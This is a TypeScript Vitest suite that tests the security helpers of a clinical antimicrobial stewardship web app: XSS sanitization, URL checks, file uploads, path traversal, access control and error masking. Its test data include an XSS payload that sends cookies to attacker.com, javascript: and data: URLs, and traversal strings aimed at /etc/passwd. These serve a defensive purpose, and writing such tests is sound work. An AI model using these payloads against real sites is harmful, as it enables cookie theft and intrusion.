import { describe, it, expect } from 'vitest';
import {
  sanitizeInput,
  sanitizeHtml,
  isSafeUrl,
  sanitizeFilename,
  validateFileUpload,
  validateInputLength,
  hasRequiredRole,
  canAccessPatientData,
  toSafeErrorMessage,
  MAX_UPLOAD_SIZE_BYTES,
} from '../lib/security';

describe('Security Hardening Test Suite — AntiSteward AMS', () => {
  // ==========================================
  // 1. XSS SANITIZATION TESTS
  // ==========================================
  describe('XSS Prevention & HTML Sanitization', () => {
    it('strips <script> tags and malicious execution payloads', () => {
      const malicious = '<script>alert("XSS Attack")</script>MRSA Sputum Culture';
      const clean = sanitizeInput(malicious);
      expect(clean).toBe('MRSA Sputum Culture');
      expect(clean).not.toContain('<script>');
    });

    it('neutralizes inline event handler injection (onerror, onload, onclick)', () => {
      const payload = '<img src="invalid-image.jpg" onerror="fetch(\'https://attacker.com/steal?c=\'+document.cookie)">Report Data';
      const clean = sanitizeInput(payload);
      expect(clean).toBe('Report Data');
      expect(clean).not.toContain('onerror');
      expect(clean).not.toContain('<img');
    });

    it('strips iframe and embedded object attacks', () => {
      const payload = '<iframe src="https://evil.org"></iframe>Patient diagnosed with sepsis';
      const clean = sanitizeInput(payload);
      expect(clean).toBe('Patient diagnosed with sepsis');
      expect(clean).not.toContain('<iframe');
    });

    it('blocks dangerous URL schemes (javascript:, data:, vbscript:)', () => {
      expect(isSafeUrl('javascript:alert(document.cookie)')).toBe(false);
      expect(isSafeUrl('data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==')).toBe(false);
      expect(isSafeUrl('vbscript:msgbox("hello")')).toBe(false);
      expect(isSafeUrl('https://hospital.org/guidelines.pdf')).toBe(true);
      expect(isSafeUrl('/dashboard/prescriptions')).toBe(true);
    });

    it('allows safe formatting tags in sanitizeHtml while removing scripts', () => {
      const mixed = '<strong>Critical AST Alert:</strong> <script>steal()</script><em>Resistant to Meropenem</em>';
      const clean = sanitizeHtml(mixed);
      expect(clean).toContain('<strong>Critical AST Alert:</strong>');
      expect(clean).toContain('<em>Resistant to Meropenem</em>');
      expect(clean).not.toContain('<script>');
      expect(clean).not.toContain('steal()');
    });
  });

  // ==========================================
  // 2. FILE UPLOAD & PATH TRAVERSAL TESTS
  // ==========================================
  describe('File Upload Security & Path Traversal Prevention', () => {
    it('rejects oversized files exceeding 5 MB limit', () => {
      const oversizedFile = {
        name: 'huge_culture_scan.pdf',
        size: MAX_UPLOAD_SIZE_BYTES + 1024,
        type: 'application/pdf',
      };
      const result = validateFileUpload(oversizedFile);
      expect(result.valid).toBe(false);
      expect(result.error).toContain('exceeds the 5 MB limit');
    });

    it('rejects zero-byte empty files', () => {
      const emptyFile = {
        name: 'empty.txt',
        size: 0,
        type: 'text/plain',
      };
      const result = validateFileUpload(emptyFile);
      expect(result.valid).toBe(false);
      expect(result.error).toContain('empty (0 bytes)');
    });

    it('rejects prohibited and executable file extensions', () => {
      const dangerousExtensions = [
        'malware.exe',
        'script.sh',
        'payload.bat',
        'backdoor.php',
        'macro.vbs',
        'exploit.dll',
      ];

      for (const fname of dangerousExtensions) {
        const file = { name: fname, size: 2048, type: 'application/octet-stream' };
        const result = validateFileUpload(file);
        expect(result.valid).toBe(false);
        expect(result.error).toContain('Unsupported file extension');
      }
    });

    it('accepts legitimate clinical document formats (.txt, .pdf, .csv, .json, .hl7, .png, .jpg)', () => {
      const validFiles = [
        { name: 'urine_culture_ast.txt', size: 1024, type: 'text/plain' },
        { name: 'microbiology_report.pdf', size: 204800, type: 'application/pdf' },
        { name: 'antibiogram_matrix.csv', size: 4096, type: 'text/csv' },
        { name: 'lab_results.json', size: 2048, type: 'application/json' },
      ];

      for (const vf of validFiles) {
        const result = validateFileUpload(vf);
        expect(result.valid).toBe(true);
        expect(result.sanitizedName).toBeDefined();
      }
    });

    it('sanitizes Directory Traversal characters in filenames', () => {
      expect(sanitizeFilename('../../../../etc/passwd')).toBe('passwd');
      expect(sanitizeFilename('..\\..\\Windows\\System32\\cmd.exe')).toBe('cmd.exe');
      expect(sanitizeFilename('valid_report_#2026!.pdf')).toBe('valid_report__2026_.pdf');
    });
  });

  // ==========================================
  // 3. RESOURCE EXHAUSTION & DoS GUARDS
  // ==========================================
  describe('Resource Exhaustion & DoS Prevention', () => {
    it('rejects massive strings exceeding 50,000 characters to prevent ReDoS', () => {
      const hugeInput = 'A'.repeat(50001);
      const result = validateInputLength(hugeInput);
      expect(result.valid).toBe(false);
      expect(result.error).toContain('maximum allowed length');
    });

    it('accepts standard clinical reports within allowed length limits', () => {
      const normalInput = 'Microbiology AST Report: Gram-negative bacilli isolated.';
      const result = validateInputLength(normalInput);
      expect(result.valid).toBe(true);
    });
  });

  // ==========================================
  // 4. ROLE-BASED ACCESS CONTROL (RBAC) TESTS
  // ==========================================
  describe('Role-Based Access Control & Privilege Escalation Defense', () => {
    it('restricts Administrator endpoints strictly to admin role', () => {
      expect(hasRequiredRole('admin', 'admin')).toBe(true);
      expect(hasRequiredRole('doctor', 'admin')).toBe(false);
      expect(hasRequiredRole('patient', 'admin')).toBe(false);
    });

    it('allows Doctors and Admins clinical prescribing privileges, but denies Patients', () => {
      const prescribingRoles = ['doctor', 'admin'] as const;
      expect(hasRequiredRole('doctor', [...prescribingRoles])).toBe(true);
      expect(hasRequiredRole('admin', [...prescribingRoles])).toBe(true);
      expect(hasRequiredRole('patient', [...prescribingRoles])).toBe(false);
    });
  });

  // ==========================================
  // 5. INSECURE DIRECT OBJECT REFERENCE (IDOR) TESTS
  // ==========================================
  describe('IDOR (Insecure Direct Object Reference) Mitigation', () => {
    const patientAId = 'patient-uuid-111';
    const patientBId = 'patient-uuid-222';

    it('prevents Patient A from accessing Patient B record (IDOR blocked)', () => {
      const canAccess = canAccessPatientData('patient', 'profile-uuid-a', patientBId, patientAId);
      expect(canAccess).toBe(false);
    });

    it('allows Patient A to access their own authorized record', () => {
      const canAccess = canAccessPatientData('patient', 'profile-uuid-a', patientAId, patientAId);
      expect(canAccess).toBe(true);
    });

    it('allows attending clinicians and administrators to access patient records', () => {
      expect(canAccessPatientData('doctor', 'doctor-profile', patientAId)).toBe(true);
      expect(canAccessPatientData('admin', 'admin-profile', patientAId)).toBe(true);
    });
  });

  // ==========================================
  // 6. SAFE ERROR SANITIZATION TESTS
  // ==========================================
  describe('Information Disclosure Prevention in Error Handling', () => {
    it('masks database connection and internal network failure details', () => {
      const rawError = new Error('getaddrinfo ENOTFOUND fvpvacksncovoverneaw.supabase.co at TCPConnectWrap.afterConnect');
      const safe = toSafeErrorMessage(rawError);
      expect(safe).not.toContain('TCPConnectWrap');
      expect(safe).not.toContain('ENOTFOUND');
      expect(safe).toContain('offline verification mode');
    });

    it('masks SQL syntax and database constraint violations', () => {
      const rawError = new Error('duplicate key value violates unique constraint "patients_mrn_key"');
      const safe = toSafeErrorMessage(rawError);
      expect(safe).toBe('Database constraint error: Invalid or duplicate reference.');
      expect(safe).not.toContain('patients_mrn_key');
    });
  });
});
